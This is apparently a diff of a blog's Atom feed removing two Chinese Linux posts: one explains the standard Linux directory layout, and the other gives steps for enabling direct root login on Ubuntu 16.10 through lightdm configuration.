-<h3 id="opt"><a href="#opt" class="headerlink" title="/opt"></a>/opt</h3><p>该目录是可选的软件包安装目录，有些软件包我们可以将它安装在该目录中。</p>
-<h3 id="tmp"><a href="#tmp" class="headerlink" title="/tmp"></a>/tmp</h3><p>该目录用于存放临时文件，有时用户运行程序的时候，会产生一些临时文件。/tmp就是用来存放临时文件的。/var/tmp目录和该目录的作用是相似的。</p>
-<h3 id="lost-found"><a href="#lost-found" class="headerlink" title="/lost+found"></a>/lost+found</h3><p>在ext2或ext3文件系统中，当系统意外崩溃或机器意外关机，而产生的一些文件碎片就存放在该目录中。当系统启动在过程中fsck工具会检查这里，并修复已经损坏的文件系统。 有时系统发生问题，有很多的文件被移到这个目录中，可能要用手工的方式来修复，或移到文件原来的位置上。</p>
-<h3 id="lib"><a href="#lib" class="headerlink" title="/lib"></a>/lib</h3><p>该目录用于存放库文件，这个目录里存放着系统最基本的共享库，其作用类似于Windows里的.dll文件。几乎所有的应用程序都须要用到这些共享库。</p>
-<h3 id="mnt"><a href="#mnt" class="headerlink" title="/mnt"></a>/mnt</h3><p>该目录是用于存放挂载储存设备的挂载目录的，系统提供这个目录是让用户临时挂载别的文件系统，比如有cdrom等目录。</p>
-<h3 id="proc"><a href="#proc" class="headerlink" title="/proc"></a>/proc</h3><p>操作系统运行时，进程（正在运行中的程序）信息及内核信息（比如cpu、硬盘分区、内存信息等）存放在这里。/proc目录是伪装的文件系统proc的挂载目录，proc并不是真正的文件系统。因此，这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。也就是说，这个目录的内容不在硬盘上而是在内存里。</p>
-<h3 id="misc"><a href="#misc" class="headerlink" title="/misc"></a>/misc</h3><p>该目录可以用来存放杂项文件或目录，即那些用途或含义不明确的文件或目录可以存放在该目录下。</p>
-<h3 id="media"><a href="#media" class="headerlink" title="/media"></a>/media</h3><p>即插即用型存储设备的挂载点自动在该目录下创建。比如USB盘系统自动挂载后，会在这个目录下产生一个目录；CDROM/DVD自动挂载后，也会在这个目录中创建一个目录，类似于cdrom这个目录。该目录只有在最新的发行套件上才有。</p>
-<h2 id="其余目录"><a href="#其余目录" class="headerlink" title="其余目录"></a>其余目录</h2><h3 id="initrd"><a href="#initrd" class="headerlink" title="/initrd"></a>/initrd</h3><p>系统在启动前的内核是压缩的（这和ramdisk有关），当系统启动时需要解压缩，该目录就是解压缩时的临时目录，当启动完后又将该目录清空。</p>
-<h3 id="usr-man"><a href="#usr-man" class="headerlink" title="/usr/man"></a>/usr/man</h3><p>该目录是Linux系统帮助文档的存放目录。</p>
-<h3 id="proc-cpuinfo"><a href="#proc-cpuinfo" class="headerlink" title="/proc/cpuinfo"></a>/proc/cpuinfo</h3><p>关于处理器的信息，如类型、厂家、型号和性能等。比如cat /proc/cpuinfo    </p>
-<h3 id="proc-devices"><a href="#proc-devices" class="headerlink" title="/proc/devices"></a>/proc/devices</h3><p>当前运行内核所配置的所有设备清单。    </p>
-<h3 id="proc-filesystems"><a href="#proc-filesystems" class="headerlink" title="/proc/filesystems"></a>/proc/filesystems</h3><p>当前运行内核所配置的文件系统。    </p>
-<h3 id="proc-dma"><a href="#proc-dma" class="headerlink" title="/proc/dma"></a>/proc/dma</h3><p>当前正在使用的DMA通道。    </p>
-<h3 id="proc-interrupts"><a href="#proc-interrupts" class="headerlink" title="/proc/interrupts"></a>/proc/interrupts</h3><p>正在使用的中断和曾经有多少个中断。    </p>
-<h3 id="proc-ioports"><a href="#proc-ioports" class="headerlink" title="/proc/ioports"></a>/proc/ioports</h3><p>当前正在使用的I/O端口。    </p>
-<h3 id="etc-init-d"><a href="#etc-init-d" class="headerlink" title="/etc/init.d"></a>/etc/init.d</h3><p>这个目录是用来存放系统或服务器以System V模式启动的脚本，这在以System V模式启动或初始化的系统中常见。比如RedHat Fedora。    </p>
-<h3 id="etc-xinetd-d"><a href="#etc-xinetd-d" class="headerlink" title="/etc/xinetd.d"></a>/etc/xinetd.d</h3><p>如果服务器是通过xinetd模式运行的，它的脚本要放在这个目录下。有些系统没有这个目录，比如Slackware，有些老的版本也没有。在Redhat Fedora中比较新的版本中存在。    </p>
-<h3 id="etc-rc-d"><a href="#etc-rc-d" class="headerlink" title="/etc/rc.d"></a>/etc/rc.d</h3><p>这是Slackware发行版中有的一个目录，是BSD方式启动脚本的存放地，比如定义网卡，服务器开启脚本等。    </p>
-<h3 id="etc-X11"><a href="#etc-X11" class="headerlink" title="/etc/X11"></a>/etc/X11</h3><p>是X-Window相关的配置文件存放地。    </p>
-<h3 id="usr-bin"><a href="#usr-bin" class="headerlink" title="/usr/bin"></a>/usr/bin</h3><p>这个目录是可执行程序的目录，普通用户就有权限执行。当我们从系统自带的软件包安装一个程序时，他的可执行文件大多会放在这个目录。相似的目录是/usr/local/bin目录。有时/usr/bin中的文件是/usr/local/bin的链接文件。    </p>
-<h3 id="usr-sbin"><a href="#usr-sbin" class="headerlink" title="/usr/sbin"></a>/usr/sbin</h3><p>这个目录也是可执行程序的目录，但大多存放涉及系统管理的命令。只有root权限才能执行，相似目录是/sbin或/usr/local/sbin或/usr/X11R6/sbin等。    </p>
-<h3 id="usr-local"><a href="#usr-local" class="headerlink" title="/usr/local"></a>/usr/local</h3><p>这个目录一般是用来存放用户自编译安装软件的存放目录。一般是通过源码包安装的软件，如果没有特别指定安装目录的话，一般是安装在这个目录中。    </p>
-<h3 id="usr-lib"><a href="#usr-lib" class="headerlink" title="/usr/lib"></a>/usr/lib</h3><p>该目录和/lib目录相似，是库文件的存储目录。存放一些常用的共享库。    </p>
-<h3 id="usr-share"><a href="#usr-share" class="headerlink" title="/usr/share"></a>/usr/share</h3><p>该目录用于存放系统共用的东西，比如/usr/share/fonts是字体目录，是用户都共用的。    </p>
-<h3 id="usr-share-doc"><a href="#usr-share-doc" class="headerlink" title="/usr/share/doc"></a>/usr/share/doc</h3><p>该目录是Linux共享文档的存放地。    </p>
-<h3 id="usr-share-man"><a href="#usr-share-man" class="headerlink" title="/usr/share/man"></a>/usr/share/man</h3><p>该目录是共享的帮助文件的存放地。    </p>
-<h3 id="usr-src"><a href="#usr-src" class="headerlink" title="/usr/src"></a>/usr/src</h3><p>该目录是内核源码存放地，下面有内核源码目录，比如linux、linux-2.xxx.xx目录等。有的系统也会把一些源码软件包安装在这里，比如Redhat Fedora。另外Redhat 4.0/5.0，它的内核源码包的目录位于/usr/src/kernels目录下的某个目录中（只有安装后才会生成相应目录）。    </p>
-<h3 id="var-adm"><a href="#var-adm" class="headerlink" title="/var/adm"></a>/var/adm</h3><p>比如软件包安装信息、日志、管理信息等就存放在该目录下，在Slackware操作系统中是有这个目录的。在Fedora中好象没有。    　</p>
-<h3 id="var-log"><a href="#var-log" class="headerlink" title="/var/log"></a>/var/log</h3><p>该目录用于存放系统日志。    </p>
-<h3 id="var-spool"><a href="#var-spool" class="headerlink" title="/var/spool"></a>/var/spool</h3><p>打印机、邮件、代理服务器等假脱机目录存放在该目录下。</p>
-<h2 id="附图"><a href="#附图" class="headerlink" title="附图"></a>附图</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/2011110620371927.png" alt=""></p>
-<p>转载自 <a href="http://www.cnblogs.com/shishm/" target="_blank" rel="external">时邵猛</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;点击阅读全文&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Linux" scheme="http://uknowsec.cn/categories/linux/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Ubuntu 16.10下root用户直接登录</title>
-    <link href="http://uknowsec.cn/posts/linux/%E7%AC%AC%E5%9B%9B%E5%91%A8-Ubuntu-16-10%E4%B8%8Broot%E7%94%A8%E6%88%B7%E7%9B%B4%E6%8E%A5%E7%99%BB%E5%BD%95.html"/>
-    <id>http://uknowsec.cn/posts/linux/第四周-Ubuntu-16-10下root用户直接登录.html</id>
-    <published>2017-03-17T12:38:37.000Z</published>
-    <updated>2017-05-01T13:49:39.234Z</updated>
-    
-    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
-<h3 id="设置root密码"><a href="#设置root密码" class="headerlink" title="设置root密码"></a>设置root密码</h3><p>使用如下命令设置root密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo passwd root</div></pre></td></tr></table></figure></p>
-<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>使用如下命令测试是否可以进入root用户，如果@前的用户名变为root则说明设置成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">su root</div></pre></td></tr></table></figure></p>
-<h3 id="修改文件"><a href="#修改文件" class="headerlink" title="修改文件"></a>修改文件</h3><p>进入到进入到/usr/share/lightdm/lightdm.conf.d/目录,使用如下命令打开此文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gedit 50-unity-greeter.conf</div></pre></td></tr></table></figure></p>
-<p>在此文件中添加如下内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">user-session=ubuntu</div><div class="line">greeter-show-manual-login=true</div><div class="line">all-guest=false</div></pre></td></tr></table></figure></p>
-<h3 id="重启系统"><a href="#重启系统" class="headerlink" title="重启系统"></a>重启系统</h3><p>点击登录，然后输入root用户，再输入前面设置的密码</p>
-<h3 id="修复错误"><a href="#修复错误" class="headerlink" title="修复错误"></a>修复错误</h3><p>登录系统后会出现：读取/root/.profile时发现错误的对话框<br>点击确定进入系统，使用如下命令修改文件，找到mesg n，修改为：tty -s &amp;&amp; mesg n<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gedit /root/.profile</div></pre></td></tr></table></figure></p>
-<p>保存退出，重启系统即可。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;点击阅读全文&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Linux" scheme="http://uknowsec.cn/categories/linux/"/>
     
     
   </entry>
